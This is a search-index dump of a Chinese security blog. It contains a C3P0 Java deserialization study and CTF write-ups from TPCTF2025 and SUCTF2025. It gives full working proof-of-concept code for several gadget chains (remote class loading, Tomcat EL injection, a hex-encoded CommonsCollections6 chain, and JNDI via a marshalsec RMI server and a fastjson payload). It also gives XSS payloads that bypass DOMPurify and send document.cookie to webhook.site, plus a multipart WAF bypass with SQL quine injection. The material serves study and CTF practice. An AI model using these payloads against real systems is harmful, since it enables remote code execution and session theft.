[{"categories":["Java"],"content":"c3p0反序列化学习\r","date":"2025-03-19","objectID":"/posts/44face1/:1:0","tags":["Java"],"title":"C3p0反序列化","uri":"/posts/44face1/"},{"categories":["Java"],"content":"前言\r早早早早该学的，太懒了拖到现在😿😿😿 ","date":"2025-03-19","objectID":"/posts/44face1/:2:0","tags":["Java"],"title":"C3p0反序列化","uri":"/posts/44face1/"},{"categories":["Java"],"content":"简介\rC3P0是JDBC的一个连接池组件 在多线程中创建线程是一个昂贵的操作，如果有大量的小任务需要执行，并且频繁地创建和销毁线程，实际上会消耗大量的系统资源，往往创建和消耗线程所耗费的时间比执行任务的时间还长。为了提高效率，我们可以线程池，而连接池也是差不多的原理，其核心作用是预先创建并维护一定数量的数据库连接，供应用程序使用，从而避免频繁创建和关闭连接带来的性能开销。 C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。 使用它的开源项目有Hibernate、Spring等。 ","date":"2025-03-19","objectID":"/posts/44face1/:3:0","tags":["Java"],"title":"C3p0反序列化","uri":"/posts/44face1/"},{"categories":["Java"],"content":"环境搭建\r添加依赖 \u003cdependency\u003e \u003cgroupId\u003ecom.mchange\u003c/groupId\u003e \u003cartifactId\u003ec3p0\u003c/artifactId\u003e \u003cversion\u003e0.9.5.2\u003c/version\u003e \u003c/dependency\u003e ","date":"2025-03-19","objectID":"/posts/44face1/:4:0","tags":["Java"],"title":"C3p0反序列化","uri":"/posts/44face1/"},{"categories":["Java"],"content":"利用方式\r在C3P0中有三种利用方式 URLClassLoader远程类加载，也被称为 http base 链 JNDI HEX序列化字节加载器 在原生的反序列化中如果找不到其他链，则可尝试C3P0去加载远程的类进行命令执行。JNDI则适用于Jackson等利用。而HEX序列化字节加载器的方式可以利用与fj和Jackson等不出网情况下打入内存马使用。 ","date":"2025-03-19","objectID":"/posts/44face1/:5:0","tags":["Java"],"title":"C3p0反序列化","uri":"/posts/44face1/"},{"categories":["Java"],"content":"URLClassLoader远程类加载\r调用链\rcom.mchange.v2.c3p0.impl 下的 PoolBackedDataSourceBase 类 其 writeObject 方法中有 先用 SerializableUtils.toByteArray 检查 connectionPoolDataSource 属性是否可序列化，如果可以则直接序列化，如果不行则用 ReferenceIndirector.indirectForm 方法处理后再进行序列化操作 这是个接口，不能被序列化所以会进入到 catch 块，我们跟进下看这个方法怎么处理的 com.mchange.v2.naming 下的 ReferenceIndirector.indirectForm 方法 public IndirectlySerialized indirectForm(Object var1) throws Exception { Reference var2 = ((Referenceable)var1).getReference(); return new ReferenceSerialized(var2, this.name, this.contextName, this.environmentProperties); } 调用了 connectionPoolDataSource 属性的 getReference方法，并用返回结果作为参数实例化一个ReferenceSerialized 对象，然后将这个对象返回，跟进 ReferenceSerialized 的构造方法可以发现 reference 就是传入的 connectionPoolDataSource 属性，是我们可控的 ReferenceSerialized(Reference var1, Name var2, Name var3, Hashtable var4) { this.reference = var1; this.name = var2; this.contextName = var3; this.env = var4; } 说完了序列化，看下其对应的反序列化操作，还是 com.mchange.v2.c3p0.impl 下的 PoolBackedDataSourceBase 其 readObejct 方法 可以看到会调用序列流中的对象为 IndirectlySerialized 类型的 getObject 方法，而刚才在分析序列化时，我们发现 ReferenceIndirector.indirectForm 方法返回的 ReferenceSerialized 对象就是 IndirectlySerialized 类型的。也就是说如果 ReferenceSerialized 被序列化成功了，那这里就是调用的ReferenceSerialized#getObject ，跟进一下 跟进后可以发现调用了 ReferenceableUtils.referenceToObject 这个静态方法 上面说过 reference 就是传入的 connectionPoolDataSource 属性，是我们可控的。继续跟进 com.mchange.v2.naming 下的 ReferenceableUtils.referenceToObject 这里var4 是从传入的 Reference 对象中获取的工厂类名称，由上面的分析来看，是可控的，所以这里我们可以通过 URLClassLoader 实例化远程类，造成任意代码执行 这里因为实现了 ConnectionPoolDataSource 接口，且 ConnectionPoolDataSource 接口继承于 CommonDataSource ，所以必须实现其所有方法 poc\rpackage org.example; import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase; import java.io.*; import java.lang.reflect.Field; import javax.naming.NamingException; import javax.naming.Reference; import javax.naming.Referenceable; import javax.sql.ConnectionPoolDataSource; import javax.sql.PooledConnection; import java.sql.SQLException; import java.sql.SQLFeatureNotSupportedException; import java.util.logging.Logger; public class c3p0 { public static class exp implements ConnectionPoolDataSource, Referenceable{ @Override public Reference getReference() throws NamingException { return new Reference(\"exp\",\"exp\",\"http://127.0.0.1:10999/\"); } @Override public PooledConnection getPooledConnection(String user, String password) throws SQLException { return null; } @Override public PooledConnection getPooledConnection() throws SQLException { return null; } @Override public PrintWriter getLogWriter() throws SQLException { return null; } @Override public void setLogWriter(PrintWriter out) throws SQLException { } @Override public void setLoginTimeout(int seconds) throws SQLException { } @Override public int getLoginTimeout() throws SQLException { return 0; } @Override public Logger getParentLogger() throws SQLFeatureNotSupportedException { return null; } } public static void main(String[] args) throws Exception{ PoolBackedDataSourceBase pds = new PoolBackedDataSourceBase(false); //将connectionPoolDataSource属性值设为恶意的class Class cl = Class.forName(\"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase\"); Field connectionPoolDataSourceField = cl.getDeclaredField(\"connectionPoolDataSource\"); connectionPoolDataSourceField.setAccessible(true); connectionPoolDataSourceField.set(pds, new exp()); Unser(pds); } public static void Unser(Object obj) throws IOException, ClassNotFoundException { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(obj); ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bis); ois.readObject(); } } exp.java import java.io.IOException; public class exp { public exp() throws IOException { Runtime.getRuntime().exec(\"calc\"); } } 总结\r调用链 PoolBackedDataSourceBase#readObject -\u003eReferenceSerialized#getObject -\u003eReferenceableUtils#referenceToObject -\u003eObjectFactory#getObjectInstance 就是加载个远程恶意类 ","date":"2025-03-19","objectID":"/posts/44face1/:5:1","tags":["Java"],"title":"C3p0反序列化","uri":"/posts/44face1/"},{"categories":["Java"],"content":"不出网利用\r环境搭建 \u003cdependency\u003e \u003cgroupId\u003eorg.apache.tomcat.embed\u003c/groupId\u003e \u003cartifactId\u003etomcat-embed-core\u003c/artifactId\u003e \u003cversion\u003e8.5.27\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.tomcat.embed\u003c/groupId\u003e \u003cartifactId\u003etomcat-embed-el\u003c/artifactId\u003e \u003cversion\u003e8.5.27\u003c/version\u003e \u003c/dependency\u003e 调用链\r和 url 链一样，不过最后不是通过 URLClassLoader 加载远程类了，而是直接加载本地字节码 回到com.mchange.v2.naming 下的 ReferenceableUtils.referenceToObject中 可以看到这里如果getFactoryClassLocation方法返回为null的时候就直接加载本地字节码 加载本地字节码的类要求其实现了 javax.naming.spi.ObjectFactory 接口，并能调用getObjectInstance方法，可以通过加载 Tomcat8 中的 org.apache.naming.factory.BeanFactory 进行 EL 表达式注入 poc\r改下 url 链子中的，修改下返回的 Reference ，打 el 表达式注入 package org.example; import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase; import org.apache.naming.ResourceRef; import java.io.*; import java.lang.reflect.Field; import javax.naming.NamingException; import javax.naming.Reference; import javax.naming.Referenceable; import javax.naming.StringRefAddr; import javax.sql.ConnectionPoolDataSource; import javax.sql.PooledConnection; import java.sql.SQLException; import java.sql.SQLFeatureNotSupportedException; import java.util.logging.Logger; public class c3p0_tomcat { public static class exp implements ConnectionPoolDataSource, Referenceable{ @Override public Reference getReference() throws NamingException { ResourceRef resourceRef = new ResourceRef(\"javax.el.ELProcessor\", (String)null, \"\", \"\", true, \"org.apache.naming.factory.BeanFactory\", (String)null); resourceRef.add(new StringRefAddr(\"forceString\", \"faster=eval\")); resourceRef.add(new StringRefAddr(\"faster\", \"Runtime.getRuntime().exec(\\\"calc.exe\\\")\")); return resourceRef; } @Override public PooledConnection getPooledConnection(String user, String password) throws SQLException { return null; } @Override public PooledConnection getPooledConnection() throws SQLException { return null; } @Override public PrintWriter getLogWriter() throws SQLException { return null; } @Override public void setLogWriter(PrintWriter out) throws SQLException { } @Override public void setLoginTimeout(int seconds) throws SQLException { } @Override public int getLoginTimeout() throws SQLException { return 0; } @Override public Logger getParentLogger() throws SQLFeatureNotSupportedException { return null; } } public static void main(String[] args) throws Exception{ PoolBackedDataSourceBase pds = new PoolBackedDataSourceBase(false); Class cl = Class.forName(\"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase\"); Field connectionPoolDataSourceField = cl.getDeclaredField(\"connectionPoolDataSource\"); connectionPoolDataSourceField.setAccessible(true); connectionPoolDataSourceField.set(pds, new exp()); Unser(pds); } public static void Unser(Object obj) throws IOException, ClassNotFoundException { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(obj); ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bis); ois.readObject(); } } 总结\rurl 链的不出网打法，但是需要 tomcat8 的依赖 ","date":"2025-03-19","objectID":"/posts/44face1/:5:2","tags":["Java"],"title":"C3p0反序列化","uri":"/posts/44face1/"},{"categories":["Java"],"content":"hex base\r调用链\r如果不出网，而且是fastjson或jackson的情况，可以用这个Gadget，该利用链能够反序列化一串十六进制字符串，因此实际利用需要有存在反序列化漏洞的组件 定位到 com.mchange.v2.c3p0.impl 下的 WrapperConnectionPoolDataSource 类中 其构造函数调用了 C3P0ImplUtils.parseUserOverridesAsString 方法 跟进一下 public static Map parseUserOverridesAsString(String userOverridesAsString) throws IOException, ClassNotFoundException { if (userOverridesAsString != null) { String hexAscii = userOverridesAsString.substring(\"HexAsciiSerializedMap\".length() + 1, userOverridesAsString.length() - 1); byte[] serBytes = ByteUtils.fromHexAscii(hexAscii); return Collections.unmodifiableMap((Map)SerializableUtils.fromByteArray(serBytes)); } else { return Collections.EMPTY_MAP; } } 先是调用 fromHexAscii将其传入的 userOverridesAsString 16进制解码，再用 fromByteArray 将其转换为map类，其输入必须满足HexAsciiSerializedMap{xxx} 的格式，其中{和}用其他任意字符代替均可 跟进看下 fromByteArray 的实现 public static Object fromByteArray(byte[] var0) throws IOException, ClassNotFoundException { Object var1 = deserializeFromByteArray(var0); return var1 instanceof IndirectlySerialized ? ((IndirectlySerialized)var1).getObject() : var1; } 触发了 deserializeFromByteArray 方法，然后判断反序列化后的对象 var1 是否是 IndirectlySerialized 类型，如果是则调用其 getObject 方法，如果不是则直接返回 var1 继续跟进 deserializeFromByteArray public static Object deserializeFromByteArray(byte[] var0) throws IOException, ClassNotFoundException { ObjectInputStream var1 = new ObjectInputStream(new ByteArrayInputStream(var0)); return var1.readObject(); } 这里直接反序列化了 ok 看下怎么传参，参数是由 getUserOverridesAsString() 方法获得的，可以用其 setter 方法来赋值 poc\r随便拿条链子，我这里拿cc6，相较于其他cc链，cc6用的更多一点 package org.example; import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; public class c3p0_hexbase { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e Lazy = LazyMap.decorate(map,new ConstantTransformer(1)); TiedMapEntry Tie=new TiedMapEntry(Lazy,\"aaa\"); HashMap\u003cObject,Object\u003e hashmap = new HashMap\u003c\u003e(); hashmap.put(Tie,\"test\"); Class\u003cLazyMap\u003e lazyMapClass = LazyMap.class; Field factoryField = lazyMapClass.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(Lazy, cha); Lazy.remove(\"aaa\"); serilize(hashmap); InputStream in = new FileInputStream(\"test.bin\"); byte[] bytein = toByteArray(in); String Hex = \"HexAsciiSerializedMap{\"+bytesToHexString(bytein,bytein.length)+\"}\"; WrapperConnectionPoolDataSource exp = new WrapperConnectionPoolDataSource(); exp.setUserOverridesAsString(Hex); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"test.bin\")); out.writeObject(obj); } //将输入流转换为字节数组 public static byte[] toByteArray(InputStream in) throws IOException { byte[] classBytes; classBytes = new byte[in.available()]; in.read(classBytes); in.close(); return classBytes; } //将字节数组转换为十六进制 public static String bytesToHexString(byte[] bArray, int length) { StringBuffer sb = new StringBuffer(length); for(int i = 0; i \u003c length; ++i) { String sTemp = Integer.toHexString(255 \u0026 bArray[i]); if (sTemp.length() \u003c 2) { sb.append(0); } sb.append(sTemp.toUpperCa","date":"2025-03-19","objectID":"/posts/44face1/:5:3","tags":["Java"],"title":"C3p0反序列化","uri":"/posts/44face1/"},{"categories":["Java"],"content":"JNDI注入\r同样也是在fastjson，jackson环境中可用。jndi适用于jdk8u191以下支持reference情况 调用链\r定位到 com.mchange.v2.c3p0 下的 JndiRefConnectionPoolDataSource 看到其 setLoginTimeout 函数 WrapperConnectionPoolDataSource wcpds; ... public void setLoginTimeout(int seconds) throws SQLException { this.wcpds.setLoginTimeout(seconds); } 调用了 WrapperConnectionPoolDataSource#setLoginTimeout ，跟进发现又调用了 setLoginTimeout public void setLoginTimeout(int seconds) throws SQLException { this.getNestedDataSource().setLoginTimeout(seconds); } 跟进发现 getNestedDataSource() 方法返回的是 this.nestedDataSource ，且发现是 setNestedDataSource 方法对 nestedDataSource 进行赋值 public synchronized DataSource getNestedDataSource() { return this.nestedDataSource; } public synchronized void setNestedDataSource(DataSource nestedDataSource) { DataSource oldVal = this.nestedDataSource; this.nestedDataSource = nestedDataSource; if (!this.eqOrBothNull(oldVal, nestedDataSource)) { this.pcs.firePropertyChange(\"nestedDataSource\", oldVal, nestedDataSource); } } 经过上面分析，我们知道在 JndiRefConnectionPoolDataSource 类调用 setLoginTimeout 时。对 WrapperConnectionPoolDataSource 进行了实例化并调用了 setNestedDataSource 方法为 nestedDataSource 变量赋值 回头看到 JndiRefConnectionPoolDataSource 的构造类 public JndiRefConnectionPoolDataSource(boolean autoregister) { this.jrfds = new JndiRefForwardingDataSource(); this.wcpds = new WrapperConnectionPoolDataSource(); this.wcpds.setNestedDataSource(this.jrfds); if (autoregister) { this.identityToken = C3P0ImplUtils.allocateIdentityToken(this); C3P0Registry.reregister(this); } } 发现这里调用了 WrapperConnectionPoolDataSource#setNestedDataSource ，并将 JndiRefForwardingDataSource 类的实例当作参数传入。因此结合前面的分析，我们知道会调用 JndiRefForwardingDataSource#setLoginTimeout，继续跟进看下其实现 public void setLoginTimeout(int seconds) throws SQLException { this.inner().setLoginTimeout(seconds); } 调用了 inner() 方法，继续跟进 private synchronized DataSource inner() throws SQLException { if (this.cachedInner != null) { return this.cachedInner; } else { DataSource out = this.dereference(); if (this.isCaching()) { this.cachedInner = out; } return out; } } 这里当 cachedInner 为空时就会调用 dereference ，然后跟进就会发现调用了 lookup 这里 jndiName 的值由 setJndiName 决定 poc\r借助marshalsec项目，启动一个RMI服务器，监听9999端口，并制定加载远程类 exp.class java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://127.0.0.1:9991/#exp\" 9999 记得在 9991 端口开 http package org.example; import com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource; public class c3p0_jndi { public static void main(String[] args)throws Exception { JndiRefConnectionPoolDataSource exp = new JndiRefConnectionPoolDataSource(); exp.setJndiName(\"rmi://localhost:9999/hello\"); exp.setLoginTimeout(1); } } 和 hex 那条链子差不多的原理，会用到 setter 方法，那就可以用 fastjson 打 String payload = \"{\" + \"\\\"@type\\\":\\\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\\\",\" + \"\\\"JndiName\\\":\\\"rmi://localhost:9999/hello\\\", \" + \"\\\"LoginTimeout\\\":0\" + \"}\"; JSON.parse(payload); 总结\r调用栈 dereference:112, JndiRefForwardingDataSource (com.mchange.v2.c3p0) inner:134, JndiRefForwardingDataSource (com.mchange.v2.c3p0) setLoginTimeout:157, JndiRefForwardingDataSource (com.mchange.v2.c3p0) setLoginTimeout:309, WrapperConnectionPoolDataSource (com.mchange.v2.c3p0) setLoginTimeout:302, JndiRefConnectionPoolDataSource (com.mchange.v2.c3p0) 先是创个 JndiRefConnectionPoolDataSource 的实例，让 WrapperConnectionPoolDataSource#setNestedDataSource 的参数值为 JndiRefForwardingDataSource 的实例，方便之后触发 JndiRefForwardingDataSource#setLoginTimeout 打 jndi fastjson 的调用栈 dereference:112, JndiRefForwardingDataSource (com.mchange.v2.c3p0) inner:134, JndiRefForwardingDataSource (com.mchange.v2.c3p0) setLoginTimeout:157, JndiRefForwardingDataSource (com.mchange.v2.c3p0) setLoginTimeout:309, WrapperConnectionPoolDataSource (com.mchange.v2.c3p0) setLoginTimeout:302, JndiRefConnectionPoolDataSource (com.mchange.v2.c3p0) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:497, Method (java.lang.reflect) setValue:96, FieldDeserializer (com.","date":"2025-03-19","objectID":"/posts/44face1/:5:4","tags":["Java"],"title":"C3p0反序列化","uri":"/posts/44face1/"},{"categories":["Java"],"content":"总结\r出网的话都可以打，url 链加载远程字节码或本地打 el 表达式注入，jndi 注入，hex 链 不出网的话就只能打，url 加载本地字节码打 el 表达式注入，hex 链反序列化16进制字符串 hex 链和 jndi 上面 poc 都是调用的 setter 来打的，getter 还没试过，都可以结合 fastjson 或者 jackson ","date":"2025-03-19","objectID":"/posts/44face1/:6:0","tags":["Java"],"title":"C3p0反序列化","uri":"/posts/44face1/"},{"categories":["Java"],"content":"参考\rhttps://www.cnblogs.com/gaorenyusi/p/18475139 https://tttang.com/archive/1411/#toc_poc_1 https://infernity.top/2025/03/13/C3P0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8 https://nlrvana.github.io/c3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#c3p0%E9%93%BE%E5%AD%90%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%E4%B8%8Eexp ","date":"2025-03-19","objectID":"/posts/44face1/:7:0","tags":["Java"],"title":"C3p0反序列化","uri":"/posts/44face1/"},{"categories":["CTF"],"content":"前言\r清华北大办的比赛，质量不用质疑，Misc 的话手搓二维码的时候一直对不上，貌似是上下颠倒了，qrzybox原来还能自动补全，算是学到了，Web 的话就复现了下 xss 的，其他题看下 wp 再说吧，题目后打 * 的是复现 ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:1:0","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"Web\r","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:0","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"baby layout\r思路很清楚，可以写 content 和 layout ，然后bot访问指定 url 时会将 flag 注入到访问的的那个网页的 cookie 中，打 xss 带 cookie。可以看到代码中对 content 和 layout 的内容都是用 DOMPurify.sanitize() 来进行了个过滤，而且可以在配置文件中看到 dompurify 版本为 3.2.4，应该不是打 0day 我们这里重点看下 content 和 layout 的实现 app.post('/api/post', (req, res) =\u003e { const { content, layoutId } = req.body; if (typeof content !== 'string' || typeof layoutId !== 'number') { return res.status(400).send('Invalid params'); } if (content.length \u003e LENGTH_LIMIT) return res.status(400).send('Content too long'); const layout = req.session.layouts[layoutId]; if (layout === undefined) return res.status(400).send('Layout not found'); const sanitizedContent = DOMPurify.sanitize(content); //将 layout 中的 {{content}} 替换为 content 的值 const body = layout.replace(/\\{\\{content\\}\\}/g, () =\u003e sanitizedContent); if (body.length \u003e LENGTH_LIMIT) return res.status(400).send('Post too long'); const id = randomBytes(16).toString('hex'); posts.set(id, body); req.session.posts.push(id); console.log(`Post ${id} ${Buffer.from(layout).toString('base64')} ${Buffer.from(sanitizedContent).toString('base64')}`); return res.json({ id }); }); app.post('/api/layout', (req, res) =\u003e { const { layout } = req.body; if (typeof layout !== 'string') return res.status(400).send('Invalid param'); if (layout.length \u003e LENGTH_LIMIT) return res.status(400).send('Layout too large'); const sanitizedLayout = DOMPurify.sanitize(layout); const id = req.session.layouts.length; req.session.layouts.push(sanitizedLayout); return res.json({ id }); }); 可以看到在 content 的实现中是先检测再替换，也就是说我们可以将 payload 分为两段，一段写入 layout ，并将会被过滤的部分替换为 {{content}}，第二段写入 content，值就为会被过滤的部分，这样的话 content 和 layout 都可以绕过 DOMPurify.sanitize() 的检测，而且也会将 content 的值拼入 layout 中，形成最后的恶意 payload。而之所以 content 的值不会被过滤，应该是没有形成一个完整的 html ，没被检测到，可以在官方的github 上找到个 demo 来测试一下：DOMPurify 3.2.4 “Shipwreck” 可以看到第二次就被过滤了而第一次却没有被过滤，弹个窗先 layout 为 \u003caudio src={{content}}\u003e content 为 \"a\" onloadstart=\"alert(1)\" create post 就弹窗了 源码也可以看到是成功插入了的 带下 cookie \"a\" onloadstart=\"fetch('https://webhook.site/98df9897-f596-4e4b-9994-3ee26ff59249?f=' + document.cookie)\" 后面两道加强题都可以参考：https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:1","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"safe layout*\r加强了过滤 将 ALLOWED_ATTR 置为空，也就是不能引用属性，但跟进后会发现还可以用 ALLOW_DATA_ATTR 和 ALLOW_ARIA_ATTR 也就是说我们依然可以用自定义的 data，后接恶意代码即可 layout \u003caudio data-a={{content}}\u003e content a\" src=\"a\" onloadstart=\"fetch('https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=' + document.cookie)\" 必须有 src 属性，不然会报错 ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:2","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"safe layout revenge*\r这道就修复了上面的非预期，把 ALLOW_ARIA_ATTR 和 ALLOW_DATA_ATTR 都设为了 false 从 出题人的wp 中看到dompurify非常严格，\u003cstyle\u003e中的任何HTML标签都将被过滤。但是，正则表达式仅检查 /\u003c[/\\ w]/ ，因此不会过滤 \u003c{{content}} ，可以用其来绕过恶意的标签 但不能直接写在 style 标签里，因为 style 标签中的会被当作 css 解析，所以把 {{content}} 包裹在 style 便签里即可，第一个 {{content}} 是用来闭合第一个 style 标签的，而前面的 a 的话是开一个新的节点，干扰html解析规则啥的，没太懂，但是不加就会解析失败 layout a\u003cstyle\u003e{{content}}\u003c{{content}}\u003c/style\u003e content img src=\"a\" onerror=fetch(`https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=`+document.cookie) \u003cstyle\u003e\u003c/style\u003e ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:3","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"supersqli\rmanage.py 加个参数启动服务器，方便调试 if len(sys.argv) == 1: sys.argv.append(\"runserver\") 在 supersqli\\web_deploy\\src\\blog\\views.py 文件中的 flag 函数中我们可以发现存在 sql 注入 但是 supersqli\\web_deploy\\simplewaf\\main.go 中的 waf 限制的很死 var sqlInjectionPattern = regexp.MustCompile(`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\\s+table|--|#|\\*\\/|\\/\\*)`) var rcePattern = regexp.MustCompile(`(?i)(\\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\\s*\\(.+\\))`) var hotfixPattern = regexp.MustCompile(`(?i)(select)`) 注意到在 go 中加了个判断，判断 mediaType 是否为 multipart/form-data 找到一篇有关利用 multipart/form-data 解析差异实现绕过的文章：https://sym01.com/posts/2021/bypass-waf-via-boundary-confusion/ 但文章中用的是 flask 框架，貌似在这里的 Django 中行不通，看下 Django 框架中对 multipart/form-data 处理，跟进到 multipartparser.py 中可以发现 Django 是通过请求头中的 Content-Disposition 字段来区分每个字段 而在 go 中的 request.go 的 multipartReader 函数中 func (r *Request) multipartReader(allowMixed bool) (*multipart.Reader, error) { v := r.Header.Get(\"Content-Type\") if v == \"\" { return nil, ErrNotMultipart } if r.Body == nil { return nil, errors.New(\"missing form body\") } d, params, err := mime.ParseMediaType(v) if err != nil || !(d == \"multipart/form-data\" || allowMixed \u0026\u0026 d == \"multipart/mixed\") { return nil, ErrNotMultipart } boundary, ok := params[\"boundary\"] if !ok { return nil, ErrMissingBoundary } return multipart.NewReader(r.Body, boundary), nil } 可以看到这里是用 boundary 的值来分隔 multipart 请求中的各个部分，截止符的话当然就是 boundary 的值加上 -- 了 经过上面的分析我们发现 go 和 Django 中用来区分不同字段的方法是不一样的，可以利用这个解析差异来绕过 waf ，请求是先经过 go 处理再经过 Django 的，我们可以先用 --boundary-- 来截止，然后再传 password 的值。当请求体为 Content-Type: multipart/form-data; boundary=----xxx Content-Length: 137 ------xxx Content-Disposition: form-data; name=\"username\" admin ------xxx-- Content-Disposition: form-data; name=\"password\"; 111 go 只会解析 ------xxx-- 前的值，也就是返回 请求的 POST 参数: username = admin 而 Django 则会返回两个参数的值 请求的 POST 参数: username = admin password = 111 后面 sql 注入的话是打 sqlite，盲注不知道为啥打不了，然后发现能打 quine 注入，这里只判断了传入的 password 是否相同，确实也比较符合其利用场景，用文章中的脚本构造下 payload：https://blog.csdn.net/qq_35782055/article/details/130348274，稍微改下，没过滤空格，不用 repalce 为 /**/ sql = input (\"输入你的sql语句,不用写关键查询的信息 形如 1'union select #\\n\") sql2 = sql.replace(\"'\",'\"') base = \"replace(replace('.',char(34),char(39)),char(46),'.')\" final = \"\" def add(string): if (\"--+\" in string): tem = string.split(\"--+\")[0] + base + \"--+\" if (\"#\" in string): tem = string.split(\"#\")[0] + base + \"#\" return tem def patch(string,sql): if (\"--+\" in string): return sql.split(\"--+\")[0] + string + \"--+\" if (\"#\" in string): return sql.split(\"#\")[0] + string + \"#\" res = patch(base.replace(\".\",add(sql2)),sql).replace(\"'.'\",'\".\"') print(res) 最后经尝试发现是两列，因此传入 1' union select 1,2,--+ ，得到 payload 1' union select 1,2,replace(replace('1\" union select 1,2,replace(replace(\".\",char(34),char(39)),char(46),\".\")--+',char(34),char(39)),char(46),'1\" union select 1,2,replace(replace(\".\",char(34),char(39)),char(46),\".\")--+')--+ ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:4","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"前言\r好多题，质量很高，misc没怎么看，全在看web，Java还是打不动😿，还有一些关于云的，也不会，先贴一下写了的wp，pop当时没做，其他题之后有空复现一下 ","date":"2025-01-14","objectID":"/posts/48766ef/:1:0","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"Misc\r","date":"2025-01-14","objectID":"/posts/48766ef/:2:0","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_checkin\r找到个password：SePassWordLen23SUCT 加密方式：PBEWithMD5AndDES 感觉hacker这个用户里的密码就是盐，但是爆破出来是 hacker（怎么不是8位） 迭代次数应该是默认的1000，不行的话爆破也行，OUTPUT应该就是密文：ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg= 后来发现不用盐也可以解密，密码SePassWordLen23SUCT其实是暗示密码length为23，其实应该是SUCTF，照着加密脚本：https://blog.csdn.net/iin729/article/details/128432332，叫ai写了个python解密脚本 import base64 import hashlib import re import itertools import string from Crypto.Cipher import DES def get_derived_key(password, salt, count): key = password + salt for i in range(count): m = hashlib.md5(key) key = m.digest() return (key[:8], key[8:]) def decrypt(msg, password): msg_bytes = base64.b64decode(msg) salt = msg_bytes[:8] enc_text = msg_bytes[8:] (dk, iv) = get_derived_key(password, salt, 1000) crypter = DES.new(dk, DES.MODE_CBC, iv) text = crypter.decrypt(enc_text) # Remove padding at the end, if any return re.sub(r'[\\x01-\\x08]', '', text.decode(\"utf-8\", errors=\"ignore\")) def brute_force_decrypt(ciphertext, prefix, length, charset): # Calculate the number of missing characters missing_length = length - len(prefix) # Generate all possible combinations of the missing characters for combination in itertools.product(charset, repeat=missing_length): # Construct the full password password = prefix + ''.join(combination) try: # Attempt to decrypt the ciphertext decrypted_text = decrypt(ciphertext, password.encode(\"utf-8\")) # Check if the decrypted text contains \"SUCTF\" if \"SUCTF\" in decrypted_text: print(f\"Found valid password: {password}\") print(f\"Decrypted text: {decrypted_text}\") return password, decrypted_text except Exception as e: # If decryption fails, just continue to the next combination continue print(\"No valid password found.\") return None, 